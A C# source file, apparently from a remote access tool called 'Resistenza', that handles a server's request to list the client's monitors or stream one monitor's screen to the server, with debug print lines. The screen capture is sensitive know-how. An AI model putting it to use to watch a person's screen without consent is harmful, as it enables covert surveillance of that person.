using Resistenza.Client.Logic;
using Resistenza.Common.Networking;
using Resistenza.Common.Packets.Microphone;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Resistenza.Common.Packets.Remote_Desktop
{
    public class DesktopStartRequest
    {
        public string Type { get; set; }
        public bool ListDevices { get; set; }
        public bool StartTransmit { get; set; }
        public int MonitorIndex { get; set; }
        public DesktopStartRequest()
        {
            Type = this.GetType().ToString();
        }

        public async Task HandleAsync(SecureStream ServerStream, CancellationTokenSourceWithId CancelOperation, SemaphoreSlim Lock)
        {
            if (ListDevices)
            {

                var DevicesPacket = new DesktopListDisplaysResponse()
                {
                    Devices = DesktopBroadcast.GetDevicesInfo(),
                };
               
                await ServerStream.SendPacketAsync(DevicesPacket); 


                return;
            }

            if (StartTransmit)
            {        
                try
                {
               
                    Console.WriteLine("[DEBUG] Creating DesktopBroadcast");
                    DesktopBroadcast Streamer = new DesktopBroadcast(ServerStream);
                    Console.WriteLine("[DEBUG] DesktopBroadcast created");

                    await Streamer.StartStreaming(MonitorIndex, CancelOperation);
                }
                catch (Exception ex)
                {
                    if(ex is OperationCanceledException)
                    {
                        CancelOperation.Token.ThrowIfCancellationRequested();
                    }
                    throw;
                    
                }
            }
        }
    }
}
